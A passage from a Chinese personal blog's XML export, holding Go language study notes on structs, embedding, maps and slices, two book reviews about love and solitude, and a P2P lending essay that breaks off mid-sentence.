( "fmt" "person" // 导包)func main() &#123; p := new(person.Person) // 使用外部包类型 p.SetName("fzy") p.SetAge(23) fmt.Println(p.Name(), p.Age()) // 调用外部包的方法&#125; 继承与多重继承 当一个匿名类型被内嵌在结构体中时，匿名类型的可见方法也同样被内嵌，这在效果上等同于外层类型 继承 了这些方法：将父类型放在子类型中来实现亚型。 内嵌将一个已存在类型的字段和方法注入到了另一个类型里：匿名字段上的方法“晋升”成为了外层类型的方法。当然类型可以有只作用于本身实例而不作用于内嵌“父”类型上的方法，可以覆写方法（像字段一样）：和内嵌类型方法具有同样名字的外层类型的方法会覆写内嵌类型对应的方法。 123456789101112131415161718192021type Student struct &#123; Person // 内嵌，继承&#125;type Person struct &#123; name string number int&#125;func (P *Person) Name() &#123; fmt.Println("Person: ", P.name)&#125;func (s *Student) Name() &#123; // 覆写Name方法 fmt.Println("Student: ", s.name)&#125;func main() &#123; s := Student&#123;Person&#123;"fzy", 11&#125;&#125; s.Name() // 调用的是接收者为Student的Name方法&#125; 输出结果： 1Student: fzy 多重继承指的是类型获得多个父类型行为的能力，它在传统的面向对象语言中通常是不被实现的（C++ 和 Python 例外）。因为在类继承层次中，多重继承会给编译器引入额外的复杂度。但是在 Go 语言中，通过在类型中嵌入所有必要的父类型，可以很简单的实现多重继承。 12345678910111213141516171819202122232425262728type Person struct &#123; name string age int&#125;type School struct &#123; names string id int&#125;type Student struct &#123; // 继承Person，又继承School Person School&#125;func (P *Person) Name() &#123; // Person的方法 fmt.Println(P.name)&#125;func (s *School) Names() &#123; // School的方法 fmt.Println(s.names)&#125;func main() &#123; s := Student&#123;Person&#123;"fzy", 11&#125;, School&#123;"csu", 111&#125;&#125; s.Name() // 内嵌结构体上的方法可以直接在外层类型的实例 s.Names()&#125; 输出结果： 12fzycsu 上面的例子中，定义了三个结构体，并实现了一些方法，结构体 Student 继承了 Person 和 School 结构体，然后也就可以调用 Person 和 School 的方法。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从你的全世界路过]]></title>
    <url>%2F2018%2F09%2F01%2F%E4%BB%8E%E4%BD%A0%E7%9A%84%E5%85%A8%E4%B8%96%E7%95%8C%E8%B7%AF%E8%BF%87%2F</url>
    <content type="text"><![CDATA[故事的开始总是这样，适逢其时，猝不及防。 故事的结果总是这样，花开两朵，天各一方。 《从你的全世界路过》是一本销量惊人，但是评分不高的书。张嘉佳以自己在微博上所讲的33个真实的爱情故事而总结编著成的爱情小说。知道张嘉佳这个人是在2016年的电影《从你的全世界路过》，这不是一部烂片，但也不是一部优秀的电影，仿佛就是张嘉佳在给我们讲故事。现在看来，电影里都是《从你的全世界路过》书里的感觉。一本看似纷杂凌乱的的睡前故事，但里面的故事却有条不紊的向你描述着人生的点点滴滴，仿佛就像在写你自己，又像是朋友在深夜跟你在叙述，讲诉他走过的人生经历。利用暑假的时间，断断续续读了两遍，即使是睡前故事，也是温暖如初。很多人觉得这很矫情，其实，我以前也很反感这样的作品。但是，书中的每个故事都那么有温度，而不是充斥着不知所云的堕落。至少，爱情这个主题还是美好的。 这本书以讲故事的方式，讲述了33个真实发生过的爱情故事。从书中可以看到很多张嘉佳生活的痕迹，但是故事的真实与否，我个人也有所质疑。毕竟，在这些睡前小故事里，有很多我们青春里难以理解的行为，很多疯狂的事迹。每个故事都是有温度的，但是作者要有如此丰富的生活阅历，如此疯狂的青春，拥有那么多奇奇怪怪的朋友，我觉得确实不太容易， 确实有很多人不喜欢这本书，觉得书中的人物都很作，也确实是很作了，他们大多不务正义，虚度人生。但是，这本书的定位是睡前故事，睡觉前看的故事，看了会让人觉得温暖。所以，我也不去与那些整日鸡汤为伴，生活充满激情，无法接受这样颓废生活的人争论这本书的好坏。虽然自己也不是特别欣赏这样的生活，但是谁的人生没有经历过迷茫甚至是颓废，或多或少在书中也能看到一点自己的影子。另外，在这些小故事里也有一些自己不曾经历过的温暖或感动，甚至自己也想要追求的小感动。睡前故事大致就是这样的吧，像是深夜电台节目中讲的故事一样，往往只有懂得的人才会觉得可贵。 生活其实是一面镜子，照出来的是你自己，书也是。最好的评价是自己看一遍，看看有多少共鸣。如果你明知道故事是假的，还被感动甚至掉眼泪，想必你也曾几何时的某个瞬间是或者想成为这样的人吧。不管是自己经历过的，还是心里想要的，这本书能够给你这样的东西就足够了。相信很多人也经历过这本书中类似的事情，虽然不及书中的疯狂，但是当时的心情大抵应该是类似的，所以很喜欢张嘉佳这样的风格。 不想参杂太多的个人情感在博客中，还是分享一些书中那些有意思的文字： 一个人的记忆就是一座城市，时间腐蚀着一切建筑，把高楼和道路全部沙化。如果你不往前走，就会被沙子掩埋。所以我们泪流满面，步步回头，可能只能往前走。——《从你的全世界路过》 “十年醉了太多次，身边换了很多人，桌上换过很多菜，杯里洒过很多酒。那是最骄傲的我们，那是最浪漫的我们，那是最无所顾忌的我们。 那是我们光芒万丈的青春。 如果可以，无论要去哪里，剩下的碳烤生蚝请让我打包。 ——《猪头的爱情》 我知道自己喜欢你，但我不知道自己的将来在哪里，因为我知道，无论哪里，我都没法带你去。而记忆打亮你的微笑，要如此用力才变得欢喜。 ——《河面下的少年》 我希望有个如你一般的人。 如这山间清晨一般明亮清爽的人， 如奔赴古城道路上阳光一般的人， 温暖而不炙热，覆盖我所有肌肤。 由起点到夜晚，由山野到书房， 一切问题的答案都很简单。我希望有个如你一般的人，贯彻未来，数遍生命的公路牌。——《我希望有个如你一般的人》 我们常说，轻易得来的。不会懂得珍惜。其实不然，轻易得来的。你会害怕失去。 因为自己挣来的，更可贵的是你获得它的能力。而从他人处攫来的，你会恐惧失去，一心想要牢牢把握在手中。 ——《生鲜小龙虾的爱情》 在季节的列车上，如果你要提前下车，请别推醒装睡的我。这样我可以沉睡到终点，假装不知道你已离开。—–《最容易丢的东西》 四季总是有一次凋零，结果无数次凋零。相爱总是有一次分离，结果无数次分离。—–《姐姐》 世事如书，我偏爰你这一句，愿做个逗号，呆在你脚边。但你有自己的朗读者，而我只是个摆渡人。—–《摆渡人》 …… 都说，一个人太久了，就开始渴盼爱情，好像有那么一个能够矢志不渝陪伴在身边的另一个，就真能融入骨血，温暖自我。希望你们也有这样适逢其时、过程精彩、结局美好的爱情故事。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我敢在你怀里孤独]]></title>
    <url>%2F2018%2F08%2F31%2F%E6%88%91%E6%95%A2%E5%9C%A8%E4%BD%A0%E6%80%80%E9%87%8C%E5%AD%A4%E7%8B%AC%2F</url>
    <content type="text"><![CDATA[世界这么大，你我这么小。我们该如何独处与相处？ 叔本华曾经说过，“要么孤独，要么庸俗”。 朋友给我推荐了刘若英的这本《我敢在你怀里孤独》，当时很惊讶，奶茶也写书吗？查了一下，咦，她好像已经写过好几本书了，惭愧惭愧。在微信读书上预览了这本书的前面一章，然后果断下单购买了纸质书。 “我敢在你怀里孤独。因为保有你，我感觉幸福，同时保有自己，所以能安心自由”，这是刘若英对于书名的解释。关于书名，很多人会觉得有点作，网络上也有很多关于书名的讨论，我倒觉得没有必要，明白就行，何必抠字眼。另外，对于书籍，我也不太关注书的评分，因为不同的人喜欢的书不一样，需要的读物也大有不同，所以别人的点评不具有太大的参考意义。有时候，我们读书，不过是想要在书中寻找自己的影子，又或是寻找自己想要成为的样子。 初次看这本书，才发现自己对奶茶其实并不了解，以前也没有特别喜欢过她，但是她的歌声却经常在耳边响起。于是乎，开始寻找那些未知的答案。刘若英的成名史可谓是十分励志了，从制作助理到歌手、演员、导演、词曲创作者，了解最多的应该是她的歌曲。有时候，会感慨怎么会有这么了不起的艺人，唱歌、演戏、摄影、写作样样在行。今年，还去看了她拍的电影《后来的我们》，没有想象中好，但是也值得肯定。 书的前半段是刘若英的自述，从书中了解到，她不仅一直保留着自己独处的空间，也很懂得如何与他人相处。当然，她对于独处的一些做法我并不是完全认同，特别是她和先生的相处方式。比如他们两个人回家一个向左走一个向右走，彼此都在独立的书房中工作，即使在一个房间，她也会找一个距离较远的角落；又比如有时她跟先生出去吃饭，在上菜前的一段时间里，先生头也不抬的玩着手机，而她却敏感而好奇的观察着身边的人。虽然说，两个人在一起最舒服的状态就是不说话也不觉得尴尬，能说话就很开心，彼此不可缺少但又给对方足够的自由，但是总感觉像奶茶描述的这样的夫妻关系没有想象的好，有时候还会觉得奶茶有些刻意去做一些事情，总觉得有点陌生。不过，每个人喜欢的方式不一样，这个也应该理解，只是个人不太认同罢了。 书的后半部分是奶茶与八位朋友（卢广仲、五月天玛莎、陈绮贞、林奕华、宋冬野、王浩威、五月天石头、詹仁雄）的对白，在一个阳光明媚的午后，约上好友喝喝咖啡，然后悠闲自在地聊聊天，主要聊的是好友们对“孤独”的看法，简单的对白却十分有趣的。从这本书中看到了不太了解的明星的生活，包括我喜欢的陈绮贞，虽然可能并不是那么真实，但是了解到他们对于独处的一些探讨。在与陈绮贞的对白中，陈绮贞认为离开网络与社群，某种程度就是一种独处。她还说，人的一生中不是在争取自己的空间就是在适应别人的空间。以及，能够一个人生活得很好以后，才能更好地与别人生活在一起，等等，这些都是陈绮贞式的感悟。奶茶与他们探讨“孤独力”，清晰地看到了孤独的本来面目——孤独可以是一种力量，而非阻力，耐得住就可以看透生活很多迷障。 进行着相处训练的奶茶与进行着独处训练的五月天的石头，他们互相像是探索着对方的领域一样，充满好奇与新发现。其实，人生的不同阶段就会需要学会处于不同的状态，需要去学会相处，也会需要去学会独处。而处于不同状态，或者说对于独处或相处更有经验的两个人，互相的交流会很有价值。在奶茶与王浩威的对白中，王浩威从心理学的角度诠释孤独力是情感高度成熟的指标，并且引用奥修的话：“有独处的能力，才有爱的能力。意思就是说，只要那些有能力独处的人，才有能力去爱，去走进一个人内心深处，而不会急着占有对方，成为对方的依赖。因为知道即使对方离开了，自己还是可以一样快乐，因为快乐不是对方给予才有的。 书中能引起共鸣的地方有很多，不仅是上面提到的那些经典的语句，还有对白中相似的成长背景和生活经历。寂寞是一种负面情绪，而孤独是一种状态，掌握与自己的相处之道，才能更好地与他人相处，有独处的能力，才有爱的能力。再分享一些书中比较有意思的句子： 我常常觉得，孤独感是与生俱来的，不是因为你是一个人，所以必定孤独，或因为有人相伴，所以圆满。孤独感对我来说并不意味着痛苦，那只是一种自己跟自己相处的状态。 孤独是一种状态，寂寞则是一种负面情绪。 当我发现我是孤独的时候，反而是种很好的状态，孤独可以让你更强壮。 那些人眼中我的“孤僻”，在我的世界里，只是珍惜并坚持那微弱的任性罢了。 发生过的事，即使被遗忘，也不会消失。 面对家人的事，再怎么累，再怎么烦，也得耐着性子好好处理。毕竟这是人生中无法躲避的相处。 相处就像把两个独处放在一起。在一起的时候像黏土，可以形塑成两个人以外的第三种样貌；分开的时候像磁铁，彼此相吸又各自独立。 感情的世界没有输赢，只有谁更无法失去谁。 身体可以老，冲动不能没有。 真正成熟美好的关系是—-即使两人暂时无话可说也无所谓，相对无言就暂时沉默，可以静静地躺在对方怀里孤独，这是两人互相信任的极致表现，也是最高境界。 看完这本书以后，我也像刘若英一样，和我的好友进行了对话，问问他们关于独处的看法。认真的交谈以后，你会发现一个你完全不了解的他/她。 分享一下我和一个特别聊得来的朋友的对话吧。她说她越来越喜欢或者是习惯独处，因为越来越不喜欢交际、越来越孤独。但是，让我没有想到的是，独处对于她来说竟然那么重要。你不曾想到，在这些孤独的时光里，她做了什么。她会为了一个想要的职位，利用周末去咖啡馆找个安静的卡座学习西班牙语，也会因为工作需要带上笔记本看视频学习 工作技能。学这些都需要很好地环境，而在我的认知里，咖啡馆并不是一个很好地选择，毕竟还是一个公共场合。她说，在家会想吃东西喝东西，甚至会很困，然后倒头就睡，而在外面会注意自己的形象，所以她会选择到咖啡馆找一个安静的角落，一个人坚持去做好一些事情。其实，你会发现，真正会独处的人往往很享受这样的时光。不用担心太多，这个时间段只属于你自己，不管是放松还是为了未来在一点点积累，我想，坚持下来，这都是美好的。 都说，那些有能力独处的人，才有能力去爱、去分享、去走入另一个人内心的最深处。突然，有点羡慕、佩服这样的你们。回顾过去，我也是一个能耐得住寂寞，也能在喧闹中玩耍的人。不过，后来为了那些所谓的未来，逐渐迷失了自我，越来越喜欢在人群中寻找快乐，独处能力渐渐退化。关于独处和相处，自己还是有很多需要学习的地方，希望以后可以像你们一样，把独处与相处都处理得很好。 人生是一段有去无回的旅行，只能充满着好奇一步步的走下去。当然会有海浪，当然会有黑夜，即便我们能欣赏她的美，也会有孤单，还怕不被了解的时候。希望，你们不管是自处还是相处，都能找到合适的角度与姿态欣赏眼前的风景，然后把遇到的事情分享给身边的人。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-结构体]]></title>
    <url>%2F2018%2F08%2F30%2FGolang%E7%AC%94%E8%AE%B0-%E7%BB%93%E6%9E%84%E4%BD%93%2F</url>
    <content type="text"><![CDATA[Golang 结构体学习。 结构体将多个不同类型命名字段序列打包成一个复合类型，每个字段叫做结构体的成员。在 Go 语言中，结构体就像是类的一种简化形式 。 Go 语言中，结构体和它所包含的数据在内存中是以连续块的形式存在的，即使结构体中嵌套有其他的结构体，这在性能上带来了很大的优势。不像 Java 中的引用类型，一个对象和它里面包含的对象可能会在不同的内存空间中，这点和 Go 语言中的指针很像。 定义与初始化 结构体定义需要使用 type 和 struct 关键字。struct 关键字定义一个新的数据类型，结构体有中有一个或多个成员。type 关键字设定了结构体的名称。结构体的格式如下： 12345type identifier struct &#123; field1 type1 field2 type2 ...&#125; 结构体的字段可以是任何类型，甚至是结构体本身，也可以是函数或者接口。例如： 1234type Person struct &#123; name string "name field" // 标签 age int&#125; 结构体中的字段除了有名字和类型外，还可以有一个可选的标签（tag）：它是一个附属于字段的字符串，可以是文档或其他的重要标记。标签的内容不可以在一般的编程中使用，只有包 reflect 能获取它。 使用 new() 函数给一个新的结构体变量分配内存，它返回指向已分配内存的指针： 1var p *Person = new(Person) 惯用方法是： 1t := new(Person) 变量 t 是一个指向 T的指针，此时结构体字段的值是它们所属类型的零值。 声明 var t T 也会给 t 分配内存，并零值化内存，但是这个时候 t 是类型T。在这两种方式中，t 通常被称做类型 T 的一个实例（instance）或对象（object）。 初始化一个结构体实例的更简短和惯用的方式如下： 1p := &amp;Person&#123;"fzy", 23&#125; // 此时p的类型是 *Person 或者： 12var p Personp = Person&#123;"fzy", 23&#125; 这种简写方式底层仍然会调用 new ()，这里值的顺序必须按照字段顺序来写。当然，也可以通过在值的前面放上字段名来初始化字段的方式，这样就可以不按顺序： 1p := &amp;Person&#123;age: 23, name: "fzy"&#125; 表达式 new(Type) 和 &amp;Type{} 是等价的。 使用 new 初始化： 作为结构体字面量初始化： 成员访问与赋值 访问结构体成员，需要使用点号 . 操作符，在 Go 语言中这叫 选择器（selector）。无论变量是一个结构体类型还是一个结构体类型指针，都使用同样的 选择器符（selector-notation） 来访问结构体的字段并赋值： 1234567891011type Person struct &#123; name string age int&#125;func main() &#123; p := new(Person) p.name = "fzy" // 访问并赋值 p.age = 23 fmt.Println(p.name, p.age)&#125; 输出结果： 1fzy 23 递归结构体 结构体类型可以通过引用自身来定义。这在定义链表或二叉树的元素（通常叫节点）时特别有用，此时节点包含指向临近节点的链接（地址）。如下所示，链表中的 su，树中的 ri 和 le 分别是指向别的节点的指针。 1234type Node struct &#123; data float64 su *Node&#125; 同样地可以定义一个双向链表，它有一个前趋节点 pr 和一个后继节点 su： 12345type Node struct &#123; pr *Node data float64 su *Node&#125; 二叉树中每个节点最多能链接至两个节点：左节点（le）和右节点（ri），这两个节点本身又可以有左右节点，依次类推。树的顶层节点叫根节点（root），底层没有子节点的节点叫叶子节点（leaves），叶子节点的 le 和 ri 指针为 nil 值。在 Go 中可以如下定义二叉树： 12345type Tree strcut &#123; le *Tree data float64 ri *Tree&#125; 内嵌结构体 结构体可以包含一个或多个 匿名（或内嵌）字段，即这些字段没有显式的名字，只有字段的类型是必须的，此时类型就是字段的名字。但是，在一个结构体中对于每一种数据类型只能有一个匿名字段。 123456789type Person struct &#123; name string int&#125;func main() &#123; p := Person&#123;"fzy", 23&#125; fmt.Println(p.name, p.int)&#125; 输出结果： 1fzy 23 匿名字段本身可以是一个结构体类型，即 结构体可以包含内嵌结构体。Go 语言中的继承是通过内嵌或组合来实现的，所以可以说，在 Go 语言中，相比较于继承，组合更受青睐。 1234567891011121314type Person struct &#123; name string age int&#125;type Student struct &#123; Person number int&#125;func main() &#123; s := Student&#123;Person&#123;"fzy", 23&#125;, 111&#125; fmt.Println(s.name, s.age, s.number)&#125; 输出结果： 1fzy 23 111 外层结构体通过 `s.name直接进入内层结构体的字段，内嵌结构体甚至可以来自其他包。内层结构体被简单的插入或者内嵌进外层结构体。这个简单的“继承”机制提供了一种方式，使得可以从另外一个或一些类型继承部分或全部实现。 当两个字段拥有相同的名字（可能是继承来的名字）时： 外层名字会覆盖内层名字（但是两者的内存空间都保留），这提供了一种重载字段或方法的方式； 如果相同的名字在同一级别出现了两次，如果这个名字被程序使用了，将会引发一个错误。没有办法来解决这种问题引起的二义性，必须由程序员自己修正。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-Map]]></title>
    <url>%2F2018%2F08%2F27%2FGolang%E7%AC%94%E8%AE%B0-Map%2F</url>
    <content type="text"><![CDATA[Golang Map学习。 map 简介 map 是一种特殊的数据结构：一种元素对（pair）的无序集合，pair 的一个元素是 key，对应的另一个元素是 value，所以这个结构也称为关联数组或字典。这是一种快速寻找值的理想结构：给定 key，对应的 value 可以迅速定位。在其他编程语言中 map 也称为字典（Python）、hash 和 HashTable 等。 map 中所有的 key 都拥有相同的数据类型，同时所有的 value 也拥有相同的数据类型，但 key 和 value 的类型不一定一样。 key 可以是任意可以用 == 或者 != 操作符比较的类型，比如 string、int、float。所以数组、切片和结构体不能作为 key (含有数组切片的结构体不能作为 key，只包含内建类型的 struct 是可以作为 key 的），但是指针和接口类型可以。 通过 key 在 map 中寻找值是很快的，比线性查找快得多，但是仍然比从数组和切片的索引中直接读取要慢 100 倍。 由于 map 使用了散列表，所以即使使用相同的顺序保存键值对，每次迭代 map 的时候顺序也有可能不一样。因此，map 是一个存储键值对的无序集合。 声明与初始化 在声明的时候不需要知道 map 的长度，map 是可以动态增长的。未初始化的 map 的值是 nil。map 是 引用类型 的： 内存用 make 方法来分配。map 的初始化： 1var map1 = make(map[keytype]valuetype) 或者使用简短声明： 1map1 := make(map[keytype]valuetype) 也可以使用 map 的字面量来创建并初始化： 1map1 := map[keytype]valuetype&#123;key: value, key : value, ......&#125; 举例： 使用 make： 12ages := make(map[string]int)fmt.Println(ages["Tom"]) // 没有赋值，实际上根本不存在这个键 输出结果： 10 使用字面量： 12ages := map[string]int&#123;"Jack": 20, "Tom": 18&#125;fmt.Println(ages["Tom"]) 输出结果： 118 和数组不同，map 可以根据新增的 key-value 对动态的伸缩，因此它不存在固定长度或者最大限制。但是你也可以选择标明 map 的初始容量 capacity ： 1make(map[keytype]valuetype, cap) 当 map 增长到容量上限的时候，如果再增加新的 key-value 对，map 的大小会自动加 1。所以出于性能的考虑，对于大的 map 或者会快速扩张的 map，即使只是大概知道容量，也最好先标明。 map 操作赋值1234ages := make(map[string]int)ages["Jack"] = 20 // 赋值ages["Tom"] = 18fmt.Println(ages["Tom"]) 测试键值对是否存在1value, isPresent := map[key] isPresent 返回一个 bool 值：如果 key 存在于 map，value 就是 key 对应的 value 值，并且 isPresent 为 true；如果 key 不存在，value 就是一个空值，并且 isPresent 会返回 false。 比如前面的例子中： 123ages := make(map[string]int)value, isPresent := ages["Tom"] // 没有赋值fmt.Println(value, isPresent) 输出结果： 10 false 和 if 混合使用： 123if _, ok := map[key]; ok &#123; // 如果存在...&#125; 删除键值对 delete() 函数用于删除集合的元素, 参数为 map 和其对应的 key。 1delete(map, key) 即使键不在 map 中，上面的操作也是安全的。map 使用给定的键来查找元素，如果键对应的元素不存在，就返回值类型的零值。 map 迭代 使用 for-range 结构遍历 map，第一个返回值 key 是 map 中的 key 值，第二个返回值则是该 key 对应的 value 值；这两个都是仅 for 循环内部可见的局部变量。 1234ages := map[string]int&#123;"Jack": 20, "Tom": 18&#125;for key, value := range ages &#123; fmt.Println(key, value)&#125; 输出结果： 12Jack 20Tom 18 只获取值： 123for _, value := range ages &#123; fmt.Println(value)&#125; 输出结果： 121820 注意 map 不是按照 key 的顺序排列的，也不是按照 value 的序排列的，有可能每次打印的输出结果顺序都不同，所以这里并没有按上面的顺序打印。 只获取键： 123for key := range ages &#123; fmt.Println(key)&#125; 输出结果： 12JackTom map 排序 map 默认是无序的，不管是按照 key 还是按照 value 默认都不排序。如果要为 map 排序，需要将 key（或者 value）拷贝到一个切片，再对切片排序，然后可以使用切片的 for-range 方法打印出所有的 key 和 value。 按值排序，即把值拷贝到切片，然后再对切片进行排序： 1234567891011ages := map[string]int&#123;"Jack": 20, "Tom": 18, "Ada": 28, "Peter": 30&#125;keys := make([]string, len(ages))i := 0for k, _ := range ages &#123; // 把键拷贝到切片 keys[i] = k i++&#125;sort.Strings(keys) // 按键排序for _, k := range keys &#123; // 按键排序后的顺序输出 fmt.Println(k, ages[k])&#125; 输出结果： 1234Ada 28Jack 20Peter 30Tom 18 按键排序，即把键拷贝到切片，然后再对切片进行排序： 1234567891011ages := map[string]int&#123;"Jack": 20, "Tom": 18, "Ada": 28, "Peter": 30&#125;values := make([]int, len(ages))i := 0for _, v := range ages &#123; values[i] = v // 把值拷贝到切片 i++&#125;sort.Ints(values) // 按值排序for _, v := range values &#123; // 输出排序结果 fmt.Println(v)&#125; 输出结果： 123418202830]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-切片]]></title>
    <url>%2F2018%2F08%2F26%2FGolang%E7%AC%94%E8%AE%B0-%E5%88%87%E7%89%87%2F</url>
    <content type="text"><![CDATA[Golang 切片学习 简介 切片（slice）是对数组一个连续片段的引用，所以切片是一个引用类型（因此更类似于 C/C++ 中的数组类型，或者 Python 中的 list 类型）。这个片段可以是整个数组，或者是由起始和终止索引标识的一些项的子集。需要注意的是，终止索引标识的项不包括在切片内。 切片在内存中的组织方式实际上是一个有 3 个域的结构体：指向相关数组的指针，切片长度以及切片容量。给定项的切片索引可能比相关数组的相同元素的索引小。和数组不同的是，切片的长度可以在运行时修改，最小为 0 最大为相关数组的长度：切片是一个 长度可变的数组。 切片是可索引的，并且可以由 len() 函数获取长度。因为切片是引用，所以它们不需要使用额外的内存并且比使用数组更有效率，所以在 Go 语言中切片比数组更常用。 声明与初始化 声明切片的格式： 1var identifier []type [] 中不需要指定长度值，如果指定长度即为数组。一个切片在未初始化之前默认为 nil，长度为 0。声明的同时初始化： 1var slice []type = arr1[start:end] 这表示 slice 是由数组 arr 从 start 索引到 end-1 索引之间的元素构成的子集（切分数组，start:end 被称为 slice 表达式）。所以 slice[0] 就等于 arr[start]。 切片也可以用类似数组的方式初始化： 1var slice = []int&#123;1, 2, 3&#125; 另外，也可以使用简短声明并进行初始化： 1slice := []int&#123;1, 2, 3&#125; 也可以使用内置函数 make 创建切片，make 的使用方式是：func make([]T, len, cap)，其中 cap 是容量（可选参数），当只指定切片的长度时： 1slice := make([]string, 3) // 长度和容量均为3 如果只指定长度，那么切片的容量和长度相等。也可以长度和容量都指定： 1slice := make([]string, 3, 5) // 长度为3，容量为5 空切片与 nil 切片： 12slice := make([]int, 0) // 长度为0的切片var slice []int // 初始化值为nil的切片 切片处理赋值和切片 赋值操作： 12slice := []int&#123;1, 2, 3, 4, 5&#125;slice[1] = 6 // 改变索引为1的元素的值 使用切片创建切片： 12345slice := []int&#123;1, 2, 3, 4, 5&#125;newSlice := slice[1:3] // 长度为2，容量为4for i, v := range newSlice &#123; fmt.Println(i, v)&#125; 输出结果： 120 21 3 slice 底层数组有5个元素 , 而 newSlice 的底层数组容量只有4个元素，newSlice 看不到。但是，由于两个切片共享了底层数组，所以如果一个切片修改了底层数组的共享部分，另一个切片也会感知到。 123456slice := []int&#123;1, 2, 3, 4, 5&#125;newSlice := slice[1:3] // 长度为2，容量为4newSlice[0] = 6for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果： 123450 11 62 33 44 5 复制 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。copy 函数提供了这样的功能： 1func copy(dst, src []T) int 它将类型为 T 的切片从源地址 src 拷贝到目标地址 dst，覆盖 dst 的相关元素，并且返回拷贝的元素个数。源地址和目标地址可能会有重叠。拷贝个数是 src 和 dst 的长度最小值。如果 src 是字符串那么元素类型就是 byte。如果你还想继续使用 src，在拷贝结束后执行 src = dst。 123456s := []int&#123;1, 2, 3&#125;slice := make([]int, 5)copy(slice, s)for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果： 123450 11 22 33 04 0 增长 内置函数 append 会处理增加长度时的所有操作细节： 1func append(s[]T, x ...T) []T 它将0 个或多个具有相同类型 s 的元素追加到切片后面并且返回新的切片；追加的元素必须和原切片的元素同类型。 12345678slice := make([]int, 3, 5)slice[0] = 1slice[1] = 2slice[2] = 3slice = append(slice, 4, 5) // 添加两个元素for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果： 123450 11 22 33 44 5 如果 s 的容量不足以存储新增元素，append 会分配新的切片来保证已有切片元素和新增元素的存储。因此，返回的切片可能已经指向一个不同的相关数组了。append 方法总是返回成功，除非系统内存耗尽了。 12345slice := []int&#123;1, 2, 3&#125; // 长度和容量均为3slice = append(slice, 4, 5) // 添加两个元素后，slice拥有一个全新的底层数组for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果同上。 合并 与增长类似，我们也可以合并两个 slice ，其本质是将一个 slice 追加到另一个的后面： 123456slice := []int&#123;1, 2, 3&#125;slice2 := []int&#123;4, 5&#125;slice = append(slice, slice2...)for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果同上。 迭代切片传统for循环 内置函数 len() 和 cap() 可以用于处理数组、切片和通道，分别获取长度和容量。于是，可以使用传统 for 循环迭代切片： 1234slice := []int&#123;1, 2, 3, 4, 5&#125;for i := 0; i &lt; len(slice); i++ &#123; fmt.Println(i, slice[i])&#125; 输出结果： 123450 11 22 33 44 5 for range1234slice := []int&#123;1, 2, 3, 4, 5&#125;for i, v := range slice &#123; fmt.Println(i, v)&#125; 输出结果： 123450 11 22 33 44 5]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈-P2P金融]]></title>
    <url>%2F2018%2F08%2F25%2F%E6%B5%85%E8%B0%88-P2P%E9%87%91%E8%9E%8D%2F</url>
    <content type="text"><![CDATA[前几天，实验室同门突然开始讨论一个话题：P2P金融，大家各抒己见，觉得还蛮有意思。自己对这方面有所了解，但也不是十分清楚，所以利用周末的时间补了补课，然后写下这篇博客分享一下。 P2P金融又叫P2P信贷，是互联网金融的一种。P2P原本是计算机网络中的术语，后来由于迅雷、快播的兴起而被大众熟知。P2P的意思就是点对点，拿到金融领域的意思是“个人对个人”的借贷和投资，这比银行的存贷款利息高，也更自由。 那么，P2P金融模式存在的价值在哪里？P2P金融的初衷是让资金供方与资金需方直接对接，其价值是减少中间环节、提高效率、降低成本。有人说，互联网金融是为国为民，给实业输血。为什么说给实业输血？因为投入给实体经济的钱太少了。看看现在的股市，再看看现在的房市就知道了，股市一片惨淡，而房市还是一如既往的火热，很多资金其实都流入了房市。有钱的人都去投资房产了，因为涨得快，赚得也就快。因此，在我国，中小微企业融资难、融资贵，一直是未能解决的问题。虽然我国的中小微企业发展迅速，已经成为国民经济的重要组成部分，在扩大就业、发展经济、活跃市场方面发挥着十分重要的作用，但是小微企业融资仍然较困难。 为何金融机构小微贷款难一直无法解决？主要还是因为中小微企业的信贷调查成本、操作成本及过高的不良率导致的银行实际净收益下降，让银行失去了投放的动力。银行更愿意把钱贷给政府投资搞基建，或者贷给买房的人啊。你想想，政府的信用多高啊，贷给政府的资金风险小，实在搞砸了政府也不会倒闭，开着印钞机印钱就可以缓解问题啊。另外，贷给买房的人风险也不高，毕竟房价要下跌几乎不可能。如果房价下跌，那贷款买房的人就有可能不再还房贷了，有可能导致银行崩盘，政府肯定不会让这样的事情发生。因此，只要房价不下跌，那么银行放出去的房贷的收入就比较稳定。然后你再想想，贷给中小微企业，本来经济就不景气，这风险多高。说不定哪天企业就倒闭了，那么不良率就会升高，银行收入也就会打折扣。 所以说，P2P金融还是有很大的需求。P2P金融模式的积极意义： 有闲散资金的投资人能够通过P2P金融平台找到合适的有资金需求的人，获得比银行存款更高的收益； 有资金需求人或者企业在P2P平台可以方便快捷地完成借款申请、查看进度以及归还借款等操作，极大提高融资效率； 对国家和社会来说，P2P模式提高了资金利用率，遏制了高利贷的滋生和蔓延，有利于经济发展和社会稳定。 有人说，P2P整体来看还是值得投资的，解决了普惠金融的实质，真正的为那些融资难的普惠人群解决燃眉之急，也给广大的投资人提供一种能获得稳定收益的固收类理财方式。但是，现实情况来看，肯定现在不是合适的时候。 P2P 